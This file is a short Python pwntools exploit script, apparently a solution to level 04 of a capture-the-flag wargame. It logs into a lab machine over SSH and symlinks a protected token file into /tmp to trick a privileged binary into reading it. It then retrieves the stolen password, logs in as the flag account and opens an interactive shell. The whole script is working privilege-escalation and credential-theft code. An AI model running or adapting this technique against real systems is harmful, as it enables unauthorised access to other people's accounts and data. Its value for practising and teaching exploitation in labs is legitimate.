#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 2:
	sys.exit("Target IP Missing") 

level04 = ssh(host=argv[1],user='level04',password='level04')
level04_shell = level04.shell('sh')
level04_shell.sendline('ln -s /home/flag04/token /tmp/link')
level04_shell.sendline('/home/flag04/flag04 /tmp/link > /tmp/pass')
flag04_password = (level04.download_data('/tmp/pass')).decode().strip('\n')
level04_shell.kill()
level04.close()

log.progress(f'Got flag04 password : {flag04_password}')

flag04 = ssh(host=argv[1],user='flag04',password=flag04_password)
flag04_shell = flag04.shell('sh')
flag04_shell.sendline('getflag') 
flag04_shell.interactive() 
